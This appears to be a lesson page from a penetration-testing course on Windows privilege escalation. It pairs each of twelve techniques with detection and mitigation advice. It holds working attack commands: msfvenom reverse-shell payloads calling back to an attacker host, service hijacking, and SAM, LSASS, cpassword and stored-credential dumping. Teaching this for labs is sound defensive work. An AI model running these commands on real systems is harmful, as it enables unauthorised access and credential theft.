# 02: Techniques

[Previous: Enumeration](01-enumeration.md) | [Session index](README.md) | [Next: Practice](03-practice.md)

Each technique below has the same three parts: how to spot it, how to exploit it,
and how it is fixed. Learn the spotting part hardest, because a box gives you no
hints about which one applies.

Work through them in the order given. That order is roughly easiest first, and it
is also roughly the order a real box is likely to fall.

## 1. Kernel exploits and missing patches

**Spot it.** Compare the OS build against the patch list.

```cmd
systeminfo
wmic qfe get HotFixID,InstalledOn
```

On your own machine you can feed `systeminfo` output to a suggester tool, or read
the build number and search it. A build with no hotfixes from the last several
years is a candidate.

**Exploit it.** Find the public exploit for that build, read it, and run it. Common
historical ones you will meet in labs: MS16-032, MS16-135, MS15-051, MS10-059.
Metasploit has modules for several.

**Fix it.** Patch. This is the one technique with a genuine one-line mitigation, and
it is why patch management exists.

**Warning.** Kernel exploits are the most likely thing to blue screen a machine.
On a real engagement, ask before you run one.

## 2. Unquoted service paths

**Spot it.** Windows resolves an unquoted path containing spaces by trying each
possibility in order. Given `C:\Program Files\My App\service.exe`, it will happily
run `C:\Program.exe` first if that file exists.

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
```

A path that contains a space and is not wrapped in quotes is the candidate.

**Exploit it.** You need write permission on one of the intermediate directories.
Then drop a malicious `Program.exe` in the right place, restart the service, and
it runs as the service account, which is often SYSTEM.

```cmd
# can I write here?
icacls "C:\Program Files\My App"

# create the payload, then restart the service
sc stop <service>
sc start <service>
```

**Fix it.** Quote the path. And do not give users write access to service
directories.

## 3. Weak service permissions

**Spot it.** A service where your user can change the binary path or the
configuration.

```cmd
# look at the service permissions
accesschk.exe /accepteula -uwcqv "YourUser" *
sc qc <servicename>
```

**Exploit it.** Reconfigure the service to run your own binary as SYSTEM.

```cmd
sc config <service> binpath= "C:\Temp\shell.exe"
sc stop <service>
sc start <service>
```

**Fix it.** Service permissions should be restricted to administrators. Nothing a
normal user can reconfigure should run as SYSTEM.

## 4. DLL hijacking

**Spot it.** A service or application that loads a DLL from a directory you can
write to, or from a path it does not fully specify. Use `Procmon` on your own
machine to see which DLL loads fail, then place a DLL with that name in a
writable location earlier in the search order.

**Exploit it.** Build a DLL that runs your payload on load, place it where the
application will find it, restart the application.

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<you> LPORT=53 -f dll -o hijack.dll
```

**Fix it.** Full paths and safe DLL search order. Do not load libraries from
user-writable directories.

## 5. Scheduled tasks

**Spot it.** Tasks that run as SYSTEM whose target binary or script you can write
to.

```cmd
schtasks /query /fo LIST /v
```

Read the "Task To Run" and "Run As User" fields. Then check permissions on whatever
it runs.

**Exploit it.** Overwrite the binary or script, wait for the trigger, or start the
task if you can.

```cmd
schtasks /run /tn "TaskName"
```

**Fix it.** Lock down the task's target files. Store task scripts where users
cannot write.

## 6. AlwaysInstallElevated

**Spot it.** Two registry keys. If both are set to 1, any user can install an MSI
as SYSTEM.

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Exploit it.** Build an MSI that runs a command, install it with `msiexec`, and it
runs as SYSTEM.

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<you> LPORT=53 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

**Fix it.** Both keys should be 0 or absent. This is a group policy mistake and it
is a total compromise for any local user.

## 7. Autorun programs

**Spot it.** Programs that run at logon, where the binary or the command sits in a
location you can write to.

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

**Exploit it.** Overwrite the target, wait for a logon, or trigger it yourself if
you can.

**Fix it.** Tight permissions on autorun targets. Monitor these keys for changes.

## 8. Autologon credentials

**Spot it.** The credentials are stored in plain text if autologon is configured.

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for `DefaultUserName` and `DefaultPassword`.

**Exploit it.** Log in as that user, and check whether they are an administrator.
Credential reuse then spreads.

**Fix it.** Do not use autologon. If you must, use `LsaSecret` storage rather than
the registry, and restrict who can read that key.

## 9. Stored credentials on disk

**Spot it.** These turn up in more places than people expect.

```cmd
type C:\Windows\Panther\unattend.xml
type C:\Windows\System32\sysprep\sysprep.xml
type C:\Windows\System32\sysprep\sysprep.inf

# group policy preferences, the cpassword field is reversible with a known key
findstr /S /I cpassword \\<domain>\sysvol\<domain>\Policies\*.xml

cmdkey /list
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Also check `web.config` and `appsettings.json` in any web root, unattended install
files, backup scripts, and `.bat` or `.ps1` files sitting in shared folders.

**Exploit it.** Use the credentials, or decrypt the cpassword, which uses a
published AES key. Then check whether that account is an administrator, or whether
the password is reused somewhere admin-flavoured.

**Fix it.** Never store credentials in these files. Remove them after imaging.
Change the cpassword, which cannot be made safe, it must be removed.

## 10. Token privileges

**Spot it.** `whoami /priv`, as covered in [Enumeration](01-enumeration.md).

**Exploit it.**

`SeImpersonatePrivilege` is the big one, and it is common on service accounts such
as IIS application pool identities and MSSQL service accounts. It lets you
impersonate a token, and the Potato family turns that into SYSTEM. Which variant
depends on the Windows version: `JuicyPotato`, `RoguePotato`, `PrintSpoofer`,
`GodPotato`, `SweetPotato`. Read the table for each one before you run it.

`SeBackupPrivilege` and `SeRestorePrivilege` let you read and write any file
regardless of permissions. That means you can copy the SAM and SYSTEM hives and
dump the local password hashes, or read any file on disk.

`SeDebugPrivilege` lets you open other processes, including LSASS, which holds
credentials in memory. Mimikatz or a dump plus `pypykatz` will get them.

`SeTakeOwnershipPrivilege` lets you take ownership of a file and then grant
yourself access, which is useful for overwriting a service binary or a config file.

**Fix it.** Very few accounts need these. Service accounts should not hold
`SeImpersonate` unless the service genuinely requires it. Apply the principle of
least privilege to service identities, not just to users.

## 11. UAC bypass

**Spot it.** You are in the local Administrators group but running unelevated, so
you have admin rights that UAC is standing in front of.

```cmd
whoami /groups | findstr /i "S-1-5-32-544"
whoami /priv
```

**Exploit it.** UAC is not a security boundary, and there are many bypasses. The
common families use `fodhelper`, `computerdefaults`, `sdclt`, or `eventvwr`, by
writing to a registry key that an auto-elevating binary reads.

**Fix it.** Set UAC to Always Notify. Understand that UAC protects against silent
escalation, not against a determined local attacker who is already an admin.

**Important.** This gets you an elevated administrator, not SYSTEM. If the goal is
`SYSTEM`, you now have `SeDebugPrivilege` and can dump LSASS, or use a service
based technique.

## 12. Credential dumping, once you are up

Once you have administrator or SYSTEM, the machine's secrets are yours.

```cmd
# local password hashes, offline
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
# then on your machine: secretsdump.py -sam sam -system system LOCAL

# credentials in memory
# mimikatz: privilege::debug, then sekurlsa::logonpasswords
```

Then reuse. Local administrator passwords are frequently identical across a fleet
because of gold image deployment, which is where lateral movement starts. This is
also why `Impacket`, `NetExec` and pass-the-hash appear in Session 4's neighbours:
one local admin password is rarely one machine.

**Fix it.** Unique local administrator passwords (LAPS), credential guard, and no
reuse of local admin credentials across machines.

## Priority order, when you land on a box

1. `whoami /priv`. Token privileges are free money and take ten seconds.
2. `systeminfo` for the build and the patch level.
3. Services: unquoted paths, then permissions.
4. Scheduled tasks.
5. The two registry keys for `AlwaysInstallElevated`.
6. Stored credentials in the usual files and in `cmdkey`, PuTTY and PS history.
7. Autoruns and autologon.
8. Only then a kernel exploit, because it is the most likely to break something.

Run `winPEAS` alongside, but treat it as a second opinion, not the first.

## Practise

Every technique here appears in the rooms in [Practice](03-practice.md).
Take the priority list above with you and work it in that order.

[Previous: Enumeration](01-enumeration.md) | [Session index](README.md) | [Next: Practice](03-practice.md)
